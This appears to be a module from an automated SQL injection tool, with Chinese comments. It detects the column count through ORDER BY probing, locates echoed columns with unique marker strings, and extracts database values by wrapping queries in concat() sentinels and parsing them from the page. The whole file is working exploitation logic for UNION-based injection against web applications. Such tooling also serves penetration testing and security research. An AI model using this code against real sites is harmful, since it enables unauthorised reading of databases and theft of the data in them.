"""UNION 注入三步曲：求字段数 -> 找回显位 -> 构造回显查询。

两个关键技巧：
    标记探测（marker）：union select 'zqx91','zqx92',... 每个位置放一个
        唯一标记，看哪些标记出现在页面里，那些位置就是“回显位”。
    哨兵提取（sentinel）：取数据时用 concat(0x5e5e, 数据, 0x2424) 包一层，
        页面出现 ^^数据$$，用正则直接抠出来，不依赖页面 HTML 结构。
"""
import re

from response import analyzer

MARKER_BASE = "zqx9"  # 页面里不可能出现的独特前缀
_MARKER_RE = re.compile(MARKER_BASE + r"(\d+)")


def find_column_count(injector, max_columns=20, truth=None):
    """ORDER BY 递增探测字段数。

    truth 传入时用布尔判断（适合没有报错回显的页面），
    否则用报错判断（order by 超出字段数会报 Unknown column）。
    返回字段数；探测不到返回 None。
    """
    for n in range(1, max_columns + 1):
        if truth is not None:
            ok = truth.check(f"order by {n}", stage="order_by")
        else:
            result = injector.inject(f"order by {n}", stage="order_by")
            ok = not analyzer.has_sql_error(result.text)
        if not ok:
            # order by n-1 还正常、order by n 出错 -> 字段数就是 n-1
            return n - 1 if n > 1 else None
    return None


def find_display_positions(injector, ncolumns, marker_base=MARKER_BASE):
    """UNION SELECT 每个位置放一个唯一标记，返回 (回显位列表, HttpResult)。"""
    cols = ",".join(f"'{marker_base}{i}'" for i in range(1, ncolumns + 1))
    result = injector.inject(f"union select {cols}", prefix=injector.union_prefix,
                             stage="find_echo")
    positions = sorted({int(i) for i in _MARKER_RE.findall(result.text)})
    return positions, result


def union_select_at(ncolumns: int, position: int, expr: str) -> str:
    """构造 union select 1,<expr>,3,... 把 expr 放到指定的回显位。"""
    cols = [str(i) for i in range(1, ncolumns + 1)]
    cols[position - 1] = expr
    return "union select " + ",".join(cols)


def extract_union(injector, position, ncolumns, select_sql, stage="extract"):
    """把一条标量 SELECT 包上 ^^$$ 放进回显位，返回提取到的字符串。

    返回 None 表示该位置没有回显（数据没有渲染到页面上）。
    """
    expr = f"concat(0x5e5e,({select_sql}),0x2424)"
    statement = union_select_at(ncolumns, position, expr)
    result = injector.inject(statement, prefix=injector.union_prefix, stage=stage)
    return analyzer.extract_sentinel(result.text)
